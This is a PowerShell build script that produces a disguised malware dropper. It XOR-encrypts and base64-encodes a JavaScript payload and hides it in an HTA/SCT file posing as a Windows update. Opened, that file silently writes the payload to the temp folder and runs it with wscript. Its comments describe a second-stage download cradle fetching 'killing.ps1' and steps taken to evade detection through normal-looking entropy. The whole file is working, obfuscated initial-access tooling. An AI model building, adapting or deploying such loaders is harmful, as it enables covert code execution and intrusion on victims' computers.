# build.ps1
$KEY = 'snapec2_secret'                      # đổi key nếu muốn
$SRC = 'pentest.js'
$OUT = 'update_windows.sct'

# --- 1) XOR + base64 ---
$key = [Text.Encoding]::UTF8.GetBytes($KEY)
$jsText = [IO.File]::ReadAllText((Join-Path $PSScriptRoot $SRC))

# --- 1b) stage 2 handoff is now DOWNLOAD-CRADLE (pentest.js fetches killing.ps1
#     from the HTTP server at runtime) — nothing embedded, keeps .js entropy normal.
#     The obfuscated stub to serve is still built by stage2/build.ps1 -> killing_obf.ps1.

$js  = [Text.Encoding]::UTF8.GetBytes($jsText)
$enc = New-Object byte[] $js.Length
for ($i=0; $i -lt $js.Length; $i++) {
    $enc[$i] = $js[$i] -bxor $key[$i % $key.Length]
}
$b64 = [Convert]::ToBase64String($enc)

# --- 2) key bytes XOR 0x5A ---
$kb = ($key | ForEach-Object { '0x{0:X2}' -f ($_ -bxor 0x5A) }) -join ','

# --- 3) template ---
$template = @'
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Update</title>
<HTA:APPLICATION
    ID="App"
    APPLICATIONNAME="Update"
    WINDOWSTATE="minimize"
    SHOWINTASKBAR="no"
    SYSMENU="no"
    CAPTION="no"
    BORDER="none"
    INNERBORDER="no"
    SCROLL="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
/>
<script language="JavaScript">
window.onload = function () {
    try {
        // ---- blob: base64( XOR( pentest.js, KEY ) ) ----
        var _B = "__BLOB__";

        // ---- KEY bytes XOR 0x5A ----
        var _KB = [__KB__];

        // ---- base64 decoder ----
        var _A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        function b64(s) {
            s = s.replace(/[^A-Za-z0-9+/=]/g, "");
            var o = [], i = 0;
            while (i < s.length) {
                var a = _A.indexOf(s.charAt(i++)),
                    b = _A.indexOf(s.charAt(i++)),
                    c = _A.indexOf(s.charAt(i++)),
                    d = _A.indexOf(s.charAt(i++));
                o.push(((a << 2) | (b >> 4)) & 0xFF);
                if (c !== -1) o.push(((b << 4) | (c >> 2)) & 0xFF);
                if (d !== -1) o.push(((c << 6) | d) & 0xFF);
            }
            return o;
        }

        // ---- rebuild KEY từ _KB ----
        function key() {
            var k = "";
            for (var i = 0; i < _KB.length; i++)
                k += String.fromCharCode(_KB[i] ^ 0x5A);
            return k;
        }

        // ---- decode ----
        function dec() {
            var bytes = b64(_B), k = key(), s = "";
            for (var i = 0; i < bytes.length; i++)
                s += String.fromCharCode(bytes[i] ^ k.charCodeAt(i % k.length));
            return s;
        }

        // ---- stager ----
        var js  = dec();
        var sh  = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");

        var tmp = fso.GetSpecialFolder(2);              // %TEMP%
        var out = fso.BuildPath(tmp.Path, "raw.js");

        var f = fso.CreateTextFile(out, true);
        f.Write(js);
        f.Close();

        sh.Run('cmd.exe /c wscript.exe "' + out + '"', 0, false);

    } catch (e) {
        // debug: new ActiveXObject("WScript.Shell").Popup(e.message, 5, "Err", 16);
    }
    window.close();
};
</script>
</head>
<body></body>
</html>
'@

$template = $template.Replace('__BLOB__', $b64).Replace('__KB__', $kb)
[IO.File]::WriteAllText((Join-Path $PSScriptRoot $OUT), $template, [Text.Encoding]::UTF8)

Write-Host "[+] Wrote $OUT"
Write-Host "    blob len : $($b64.Length)"
Write-Host "    key bytes: $kb"